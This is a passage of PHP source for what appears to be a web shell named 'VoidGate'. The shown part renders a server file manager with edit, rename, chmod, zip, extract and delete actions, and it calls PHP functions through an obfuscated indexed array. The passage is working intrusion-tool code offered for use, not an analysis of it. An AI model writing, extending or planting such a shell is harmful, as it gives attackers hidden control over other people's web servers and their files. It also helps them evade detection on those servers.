$file){if($file=='.'||$file=='..')continue;if($f[5]($path.'/'.$file))$dirs_list[]=$file;else $files_list[]=$file;}}sort($dirs_list);sort($files_list);$sorted_list=array_merge($dirs_list,$files_list);foreach($sorted_list as $file){$file_path=$path.'/'.$file;$is_dir=$f[5]($file_path);$actions_link='?p=files&target='.urlencode($file).'&path='.urlencode($path);echo'<tr><td data-label="Select"><input type="checkbox" class="file-checkbox" name="selected_files[]" value="'.$f[14]($file_path).'"></td>';echo'<td data-label="Name">';if($is_dir)echo'<a href="?p=files&path='.urlencode($file_path).'"><b>'.$f[14]($file).'</b></a>';else echo $f[14]($file);echo'</td>';echo'<td data-label="Size">'.($is_dir?'DIR':formatSize(@$f[15]($file_path))).'</td>';echo'<td data-label="Permissions"><a href="'.$actions_link.'&action=chmod">'.getPerms($file_path).'</a></td>';echo'<td data-label="Modified">'.$f[18]("Y-m-d H:i:s",@$f[19]($file_path)).'</td>';echo'<td data-label="Actions" class="file-actions">';if(!$is_dir)echo'<a href="'.$actions_link.'&action=edit">Edit</a>';echo'<a href="'.$actions_link.'&action=rename">Rename</a>';if(!$is_dir&&$f[29]('ZipArchive')&&@$f[28]($file_path)['extension']=='zip')echo'<a href="'.$actions_link.'&action=extract">Extract</a>';echo'<a href="'.$actions_link.'&action=delete" onclick="return confirm(\'Delete?\')">Del</a>';echo'</td></tr>';}?></tbody></table><?php if($f[29]('ZipArchive')):?><div style="margin-top:10px;"><input type="submit" name="zip_selected" value="Zip Selected"></div><?php endif;?></form><?php }break;endswitch;?><div style="text-align:center;margin-top:20px;padding:10px;color:#777;">VoidGate by <?php echo$f[14]($CONFIG['author']);?> - 2025</div></div></body></html>
